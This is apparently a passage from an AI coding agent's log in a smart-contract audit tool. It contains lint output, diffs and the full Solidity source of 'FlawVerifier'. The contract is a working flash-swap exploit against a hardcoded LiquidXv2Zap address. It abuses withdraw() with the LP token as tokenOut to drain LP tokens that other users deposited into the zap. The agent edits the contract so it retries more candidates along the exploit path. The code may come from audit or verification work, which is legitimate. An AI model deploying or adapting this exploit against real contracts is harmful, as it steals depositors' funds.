+    = note: wrap modifier logic to reduce code size
+            
+            - modifier onlyOpertaor() {
+            -   require(operators[msg.sender], "LiquidXv2Zap: !operator");
+            -   _;
+            - }
+            + modifier onlyOpertaor() {
+            +   _onlyOpertaor();
+            +   _;
+            + }
+            + 
+            + function _onlyOpertaor() internal {
+            +   require(operators[msg.sender], "LiquidXv2Zap: !operator");
+            + }
+            
+            
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#unwrapped-modifier-logic
+
+
+codex
+The file now compiles cleanly and the only behavioral change is broader candidate retrying on the same exploit path. I’m pulling the full final source so I can return exactly `src/FlawVerifier.sol` and nothing else.
+exec
+/bin/bash -lc "sed -n '521,760p' /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply,
+        uint256 upperBoundLp
+    ) internal pure returns (uint256) {
+        if (token0Needed == 0 || upperBoundLp == 0) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = upperBoundLp;
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _minToken0ForMintedLp(
+        uint256 lpTarget,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpTarget == 0 || reserve0 <= 1) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = reserve0 - 1;
+        if (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
+            return 0;
+        }
+
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+
+        return low;
+    }
+
+    function _previewOneSidedMintToken0(
+        uint256 amountIn,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (amountIn == 0 || reserve0 == 0 || reserve1 == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
+        if (swapAmount == 0 || swapAmount >= amountIn) {
+            return 0;
+        }
+
+        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
+        if (amount1Out == 0 || amount1Out >= reserve1) {
+            return 0;
+        }
+
+        uint256 remaining0 = amountIn - swapAmount;
+        uint256 postSwapReserve0 = reserve0 + swapAmount;
+        uint256 postSwapReserve1 = reserve1 - amount1Out;
+        if (postSwapReserve0 == 0 || postSwapReserve1 == 0) {
+            return 0;
+        }
+
+        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
+        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
+        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
+    }
+
+    function _consolidatedToToken0(
+        uint256 lpAmount,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpAmount == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 amount0 = (reserve0 * lpAmount) / supply;
+        uint256 amount1 = (reserve1 * lpAmount) / supply;
+        if (amount0 == 0 && amount1 == 0) {
+            return 0;
+        }
+
+        if (amount0 >= reserve0 || amount1 >= reserve1) {
+            return 0;
+        }
+
+        uint256 postReserve0 = reserve0 - amount0;
+        uint256 postReserve1 = reserve1 - amount1;
+        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
+        return amount0 + swapped;
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
+    }
+
+    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
+        if (reserve == 0 || inAmount == 0) {
+            return 0;
+        }
+        uint256 a1 = reserve * reserve * 1997 * 1997;
+        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
+        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
+    }
+
+    function _sqrt(uint256 x) internal pure returns (uint256 y) {
+        uint256 z = (x + 1) / 2;
+        y = x;
+        while (z < y) {
+            y = z;
+            z = (x / z + z) / 2;
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        uint256 current = IERC20(token).allowance(address(this), spender);
+        if (current >= amount) {
+            return;
+        }
+        if (current != 0) {
+            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        }
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
+    }
+
+    function _forceTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool success, bytes memory returnData) = token.call(data);
+        require(success, "token call failed");
+        if (returnData.length > 0) {
+            require(abi.decode(returnData, (bool)), "token op returned false");
+        }
+    }
+}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index dc2896fa25456910a9e86866f64bf397159bf1b4..6b64d5612f9b1b9be4821abeea054cd567239e81
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -163,7 +163,6 @@
+             return;
+         }
+ 
+-        Plan memory best;
+         for (uint256 i = 0; i < pairCount; ++i) {
+             address pair = _allPairs(factory, i);
+             if (pair == address(0)) {
+@@ -179,21 +178,10 @@
+                 continue;
+             }
+ 
+-            Plan memory candidate = _buildPlan(state);
+-            if (candidate.previewProfitLp > best.previewProfitLp) {
+-                best = candidate;
++            if (_attemptPair(state)) {
++                return;
+             }
+         }
+-
+-        if (best.previewProfitLp == 0) {
+-            return;
+-        }
+-
+-        try this.attemptFlash(best) returns (bool ok) {
+-            if (ok) {
+-                return;
+-            }
+-        } catch {}
+     }
+ 
+     function attemptFlash(Plan calldata plan) external returns (bool) {
+@@ -402,6 +390,37 @@
+         }
+     }
+ 
++    function _attemptPair(PairState memory state) internal returns (bool) {
++        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
++        if (maxBurnLp == 0) {
++            return false;
++        }
++
++        uint256[7] memory sampleLp;
++        sampleLp[0] = maxBurnLp;
++        sampleLp[1] = maxBurnLp / 2;
++        sampleLp[2] = maxBurnLp / 4;
++        sampleLp[3] = maxBurnLp / 8;
++        sampleLp[4] = maxBurnLp / 16;
++        sampleLp[5] = maxBurnLp / 32;
++        sampleLp[6] = maxBurnLp / 64;
++
++        for (uint256 i = 0; i < sampleLp.length; ++i) {
++            Plan memory candidate = _planForSample(state, sampleLp[i]);
++            if (candidate.previewProfitLp == 0) {
++                continue;
++            }
++
++            try this.attemptFlash(candidate) returns (bool ok) {
++                if (ok) {
++                    return true;
++                }
++            } catch {}
++        }
++
++        return false;
++    }
++
+     function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+         if (burnLp == 0) {
+             return plan;
+
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IRouterLike {
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IFactoryAllPairs {
+    function allPairsLength() external view returns (uint256);
+    function allPairs(uint256 index) external view returns (address);
+}
+
+interface IPair is IERC20 {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface ISwapPlusStructs {
+    struct SwapRouter {
+        string platform;
+        address tokenIn;
+        address tokenOut;
+        uint256 amountOutMin;
+        uint256 meta;
+        uint256 percent;
+    }
+
+    struct SwapLine {
+        SwapRouter[] swaps;
+    }
+
+    struct SwapBlock {
+        SwapLine[] lines;
+    }
+
+    struct SwapPath {
+        SwapBlock[] path;
+    }
+}
+
+interface ILiquidXv2Zap is ISwapPlusStructs {
+    function router() external view returns (address);
+    function factory() external view returns (address);
+
+    function deposit(
+        address account,
+        address token,
+        address tokenM,
+        SwapPath calldata path,
+        address token0,
+        address token1,
+        uint256[3] calldata amount,
+        uint256 basketId
+    ) external payable returns (uint256);
+
+    function withdraw(
+        address account,
+        address token0,
+        address token1,
+        uint256 amount,
+        address tokenOut,
+        uint256 basketId,
+        address tokenM,
+        SwapPath calldata wpath,
+        uint256[3] calldata amountMin
+    ) external returns (uint256);
+}
+
+contract FlawVerifier is ISwapPlusStructs {
+    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public exploitPair;
+    address public exploitToken0;
+    address public exploitToken1;
+    uint256 public seedCapitalUsed;
+    uint256 public stolenAmount;
+
+    struct PairState {
+        address pair;
+        address token0;
+        address token1;
+        uint256 reserve0;
+        uint256 reserve1;
+        uint256 supply;
+        uint256 zapLpBalance;
+    }
+
+    struct Plan {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+        uint256 previewStealLp;
+        uint256 previewRepayLp;
+        uint256 previewProfitLp;
+    }
+
+    struct AttemptContext {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+    }
+
+    AttemptContext private _attempt;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+        address factory = zap.factory();
+        uint256 pairCount = _allPairsLength(factory);
+        if (pairCount == 0) {
+            return;
+        }
+
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pair = _allPairs(factory, i);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            PairState memory state = _loadPairState(pair);
+            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
+                continue;
+            }
+
+            if (state.zapLpBalance == 0) {
+                continue;
+            }
+
+            if (_attemptPair(state)) {
+                return;
+            }
+        }
+    }
+
+    function attemptFlash(Plan calldata plan) external returns (bool) {
+        require(msg.sender == address(this), "self only");
+
+        _attempt = AttemptContext({
+            pair: plan.pair,
+            token0: plan.token0,
+            token1: plan.token1,
+            capitalAmount: plan.capitalAmount,
+            burnLp: plan.burnLp
+        });
+
+        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
+        return _profitAmount > 0;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    receive() external payable {}
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
+        require(msg.sender == _attempt.pair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
+        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");
+
+        uint256 lpBefore = IERC20(_attempt.pair).balanceOf(address(this));
+
+        // exploit_paths[0]: basket users deposited with `basketId != 0`, so LP tokens
+        // remain parked in the zap's shared pair balance. This verifier only targets
+        // pairs where that pre-existing zap LP inventory is already present on-chain.
+
+        // exploit_paths[1]: the attacker obtains a small, real withdrawable position for
+        // the same pair. Flashswap funding only replaces upfront capital; it does not
+        // change the exploit causality or the assets used by the vulnerable withdraw.
+        uint256 mintedLp = _seedWithdrawablePosition(_attempt.capitalAmount);
+        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");
+
+        // exploit_paths[2]: call `withdraw()` on that legitimate LP position while
+        // setting `tokenOut` to the pair LP token itself.
+        _stealBasketBackedLp(_attempt.burnLp);
+
+        // exploit_paths[3]: `withdraw()` burns the legitimate LP position into token0 /
+        // token1, but its final unchecked transfer sends `IERC20(pair)` from the zap's
+        // shared balance to the attacker.
+        uint256 stolenLp = IERC20(_attempt.pair).balanceOf(address(this)) - lpBefore;
+        require(stolenLp > 0, "no stolen LP");
+
+        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
+        _repayFlashswapWithStolenLp(stolenLp, amountOwed);
+        _forceTransfer(_attempt.token0, _attempt.pair, amountOwed);
+
+        _profitToken = _attempt.pair;
+        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
+        require(_profitAmount > 0, "zero profit");
+
+        hypothesisValidated = true;
+        exploitPair = _attempt.pair;
+        exploitToken0 = _attempt.token0;
+        exploitToken1 = _attempt.token1;
+        seedCapitalUsed = _attempt.capitalAmount;
+        stolenAmount = stolenLp;
+    }
+
+    function _seedWithdrawablePosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
+        _forceApprove(_attempt.token0, TARGET, capitalAmount);
+
+        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        mintedLp = ILiquidXv2Zap(TARGET).deposit(
+            address(this),
+            _attempt.token0,
+            address(0),
+            emptyPath,
+            _attempt.token0,
+            _attempt.token1,
+            depositAmounts,
+            0
+        );
+    }
+
+    function _stealBasketBackedLp(uint256 burnLp) internal {
+        _forceApprove(_attempt.pair, TARGET, burnLp);
+
+        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        ILiquidXv2Zap(TARGET).withdraw(
+            address(this),
+            _attempt.token0,
+            _attempt.token1,
+            burnLp,
+            _attempt.pair,
+            0,
+            address(0),
+            emptyPath,
+            amountMins
+        );
+    }
+
+    function _repayFlashswapWithStolenLp(uint256 stolenLp, uint256 amountOwed) internal {
+        address router = ILiquidXv2Zap(TARGET).router();
+
+        (uint112 reserve0, uint112 reserve1, ) = IPair(_attempt.pair).getReserves();
+        uint256 supply = IPair(_attempt.pair).totalSupply();
+        uint256 repayLp = _minLpForToken0(
+            amountOwed,
+            uint256(reserve0),
+            uint256(reserve1),
+            supply,
+            stolenLp
+        );
+        require(repayLp < stolenLp, "not profitable");
+
+        _forceApprove(_attempt.pair, router, repayLp);
+        IRouterLike(router).removeLiquidity(
+            _attempt.token0,
+            _attempt.token1,
+            repayLp,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
+        if (token1Balance > 0) {
+            _forceApprove(_attempt.token1, router, token1Balance);
+            address[] memory path = new address[](2);
+            path[0] = _attempt.token1;
+            path[1] = _attempt.token0;
+            IRouterLike(router).swapExactTokensForTokens(
+                token1Balance,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
+        }
+
+        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "repayment shortfall");
+    }
+
+    function _buildPlan(PairState memory state) internal pure returns (Plan memory best) {
+        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return best;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp / 64;
+        sampleLp[1] = maxBurnLp / 32;
+        sampleLp[2] = maxBurnLp / 16;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 4;
+        sampleLp[5] = maxBurnLp / 2;
+        sampleLp[6] = maxBurnLp;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, sampleLp[i]);
+            if (candidate.previewProfitLp > best.previewProfitLp) {
+                best = candidate;
+            }
+        }
+    }
+
+    function _attemptPair(PairState memory state) internal returns (bool) {
+        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return false;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp;
+        sampleLp[1] = maxBurnLp / 2;
+        sampleLp[2] = maxBurnLp / 4;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 16;
+        sampleLp[5] = maxBurnLp / 32;
+        sampleLp[6] = maxBurnLp / 64;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, sampleLp[i]);
+            if (candidate.previewProfitLp == 0) {
+                continue;
+            }
+
+            try this.attemptFlash(candidate) returns (bool ok) {
+                if (ok) {
+                    return true;
+                }
+            } catch {}
+        }
+
+        return false;
+    }
+
+    function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+        if (burnLp == 0) {
+            return plan;
+        }
+
+        uint256 previewStealLp = _consolidatedToToken0(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (previewStealLp == 0 || previewStealLp > state.zapLpBalance) {
+            return plan;
+        }
+
+        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (capitalAmount == 0 || capitalAmount >= state.reserve0) {
+            return plan;
+        }
+
+        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
+        uint256 previewRepayLp = _minLpForToken0(
+            amountOwed,
+            state.reserve0,
+            state.reserve1,
+            state.supply,
+            previewStealLp
+        );
+        if (previewRepayLp == 0 || previewRepayLp >= previewStealLp) {
+            return plan;
+        }
+
+        plan = Plan({
+            pair: state.pair,
+            token0: state.token0,
+            token1: state.token1,
+            capitalAmount: capitalAmount,
+            burnLp: burnLp,
+            previewStealLp: previewStealLp,
+            previewRepayLp: previewRepayLp,
+            previewProfitLp: previewStealLp - previewRepayLp
+        });
+    }
+
+    function _loadPairState(address pair) internal view returns (PairState memory state) {
+        state.pair = pair;
+        state.token0 = IPair(pair).token0();
+        state.token1 = IPair(pair).token1();
+        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
+        state.reserve0 = uint256(reserve0);
+        state.reserve1 = uint256(reserve1);
+        state.supply = IPair(pair).totalSupply();
+        state.zapLpBalance = IERC20(pair).balanceOf(TARGET);
+    }
+
+    function _emptyPath() internal pure returns (SwapPath memory path) {
+        path.path = new SwapBlock[](0);
+    }
+
+    function _allPairsLength(address factory) internal view returns (uint256 count) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector)
+        );
+        if (ok && data.length >= 32) {
+            count = abi.decode(data, (uint256));
+        }
+    }
+
+    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index)
+        );
+        if (ok && data.length >= 32) {
+            pair = abi.decode(data, (address));
+        }
+    }
+
+    function _maxLpForStealCap(
+        uint256 stealCapLp,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (supply <= 1) {
+            return 0;
+        }
+
+        uint256 low = 0;
+        uint256 high = supply - 1;
+        while (low < high) {
+            uint256 mid = (low + high + 1) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCapLp) {
+                low = mid;
+            } else {
+                high = mid - 1;
+            }
+        }
+        return low;
+    }
+
+    function _minLpForToken0(
+        uint256 token0Needed,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply,
+        uint256 upperBoundLp
+    ) internal pure returns (uint256) {
+        if (token0Needed == 0 || upperBoundLp == 0) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = upperBoundLp;
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _minToken0ForMintedLp(
+        uint256 lpTarget,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpTarget == 0 || reserve0 <= 1) {
+            return 0;
+        }
+
+        uint256 low = 1;
+        uint256 high = reserve0 - 1;
+        if (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
+            return 0;
+        }
+
+        while (low < high) {
+            uint256 mid = (low + high) >> 1;
+            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+
+        return low;
+    }
+
+    function _previewOneSidedMintToken0(
+        uint256 amountIn,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (amountIn == 0 || reserve0 == 0 || reserve1 == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
+        if (swapAmount == 0 || swapAmount >= amountIn) {
+            return 0;
+        }
+
+        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
+        if (amount1Out == 0 || amount1Out >= reserve1) {
+            return 0;
+        }
+
+        uint256 remaining0 = amountIn - swapAmount;
+        uint256 postSwapReserve0 = reserve0 + swapAmount;
+        uint256 postSwapReserve1 = reserve1 - amount1Out;
+        if (postSwapReserve0 == 0 || postSwapReserve1 == 0) {
+            return 0;
+        }
+
+        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
+        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
+        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
+    }
+
+    function _consolidatedToToken0(
+        uint256 lpAmount,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (lpAmount == 0 || supply == 0) {
+            return 0;
+        }
+
+        uint256 amount0 = (reserve0 * lpAmount) / supply;
+        uint256 amount1 = (reserve1 * lpAmount) / supply;
+        if (amount0 == 0 && amount1 == 0) {
+            return 0;
+        }
+
+        if (amount0 >= reserve0 || amount1 >= reserve1) {
+            return 0;
+        }
+
+        uint256 postReserve0 = reserve0 - amount0;
+        uint256 postReserve1 = reserve1 - amount1;
+        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
+        return amount0 + swapped;
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
+            return 0;
+        }
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
+    }
+
+    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
+        if (reserve == 0 || inAmount == 0) {
+            return 0;
+        }
+        uint256 a1 = reserve * reserve * 1997 * 1997;
+        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
+        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
+    }
+
+    function _sqrt(uint256 x) internal pure returns (uint256 y) {
+        uint256 z = (x + 1) / 2;
+        y = x;
+        while (z < y) {
+            y = z;
+            z = (x / z + z) / 2;
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        uint256 current = IERC20(token).allowance(address(this), spender);
+        if (current >= amount) {
+            return;
+        }
+        if (current != 0) {
+            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        }
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
+    }
+
+    function _forceTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool success, bytes memory returnData) = token.call(data);
+        require(success, "token call failed");
+        if (returnData.length > 0) {
+            require(abi.decode(returnData, (bool)), "token op returned false");
+        }
+    }
+}
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index dc2896fa25456910a9e86866f64bf397159bf1b4..6b64d5612f9b1b9be4821abeea054cd567239e81
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -163,7 +163,6 @@
+             return;
+         }
+ 
+-        Plan memory best;
+         for (uint256 i = 0; i < pairCount; ++i) {
+             address pair = _allPairs(factory, i);
+             if (pair == address(0)) {
+@@ -179,21 +178,10 @@
+                 continue;
+             }
+ 
+-            Plan memory candidate = _buildPlan(state);
+-            if (candidate.previewProfitLp > best.previewProfitLp) {
+-                best = candidate;
++            if (_attemptPair(state)) {
++                return;
+             }
+         }
+-
+-        if (best.previewProfitLp == 0) {
+-            return;
+-        }
+-
+-        try this.attemptFlash(best) returns (bool ok) {
+-            if (ok) {
+-                return;
+-            }
+-        } catch {}
+     }
+ 
+     function attemptFlash(Plan calldata plan) external returns (bool) {
+@@ -402,6 +390,37 @@
+         }
+     }
+ 
++    function _attemptPair(PairState memory state) internal returns (bool) {
++        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
++        if (maxBurnLp == 0) {
++            return false;
++        }
++
++        uint256[7] memory sampleLp;
++        sampleLp[0] = maxBurnLp;
++        sampleLp[1] = maxBurnLp / 2;
++        sampleLp[2] = maxBurnLp / 4;
++        sampleLp[3] = maxBurnLp / 8;
++        sampleLp[4] = maxBurnLp / 16;
++        sampleLp[5] = maxBurnLp / 32;
++        sampleLp[6] = maxBurnLp / 64;
++
++        for (uint256 i = 0; i < sampleLp.length; ++i) {
++            Plan memory candidate = _planForSample(state, sampleLp[i]);
++            if (candidate.previewProfitLp == 0) {
++                continue;
++            }
++
++            try this.attemptFlash(candidate) returns (bool ok) {
++                if (ok) {
++                    return true;
++                }
++            } catch {}
++        }
++
++        return false;
++    }
++
+     function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+         if (burnLp == 0) {
+             return plan;
+
+tokens used
+36,647
